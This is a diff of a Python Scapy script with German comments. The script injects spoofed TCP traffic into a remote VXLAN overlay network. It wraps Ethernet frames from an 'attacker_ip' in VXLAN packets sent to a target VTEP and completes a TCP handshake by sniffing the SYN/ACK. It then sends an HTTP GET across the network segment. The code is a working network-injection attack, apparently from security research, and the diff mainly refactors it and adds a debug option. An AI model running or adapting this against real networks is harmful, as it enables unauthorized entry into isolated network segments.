@@ -2,9 +2,9 @@
 
 """
 Usage:
-./http.py 10.10.10.10 /onos/ui
+./http_asym.py IP Port debug 
 
-"/onos/ui" is optional
+./http_asym.py 10.0.0.10 80 debug
 
  """
 from scapy.all import *
@@ -17,6 +17,8 @@ from threading import Thread
 import time
 
 
+### Variabeln definieren
+
 vtep_dst = "192.168.10.149"
 vtep_src = "172.20.10.254" #Hier muss eine IP aus meinem Subnetz stehen, sonst verwirft der erste Hop das Paket!
 vxlanport = 4789
@@ -27,15 +29,7 @@ attacker_ip = "172.20.10.10"
 http_port = int(sys.argv[2])
 s_port = random.randint(20000,65500)
 
-VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
-
-
-
-dest = sys.argv[1]
-getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
-max = 1
-
-# TCP-Flags
+# TCP-Flags definieren
 FIN = 0x01
 SYN = 0x02
 RST = 0x04
@@ -45,8 +39,24 @@ URG = 0x20
 ECE = 0x40
 CWR = 0x80
 
+### Check if debug is enabled
+if sys.argv[3] is not "":
+    debug = 1
+else:
+    debug = 0
 
-def custom_action(packet):
+### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
+VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
+
+### HTTP GET Paket 
+# Hier wurd durch ein Argument des Skripts die Destination Address mitgtgeben. Accept-Encoding ist 8bit, damit nicht codiert wird.
+dest = sys.argv[1]
+getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
+
+
+### syn_ack_do ist die Funktion, die beim sniffen des SYN/ACK Pakets ausgefuehrt wird
+# Fuer das folgenden ACK Paket sind folende Parameter wichtig: Dst_Port, ACK#, SEQ#
+def syn_ack_do(packet):
     #print(packet.summary())
     #print(packet[TCP].dport)
     global syn_ack_dport
@@ -55,17 +65,19 @@ def custom_action(packet):
     syn_ack_ack = packet[TCP].ack
     global syn_ack_seq
     syn_ack_seq = packet[TCP].seq
-    print("dport = " + str(syn_ack_dport))
-    print("ack = " + str(syn_ack_ack))
-    print("seq = " + str(syn_ack_seq))
+    if debug:
+        print("############## SYN/ACK packet ##############")
+        print("dport von SYN/ACK = " + str(syn_ack_dport))
+        print("ACK# = " + str(syn_ack_ack))
+        print("SEQ# = " + str(syn_ack_seq))
+        print("############################################")
     return
 
 #SEND SYN
 syn = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(sport=s_port, dport=http_port, flags='S')
 send(syn)
 #GET SYNACK : TCP flags SYN and ACK are set
-sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & SYN, prn=custom_action, count = 1)
-
+sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & SYN, prn=syn_ack_do, count = 1)
 
 #Send ACK
 out_ack = send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='A'))
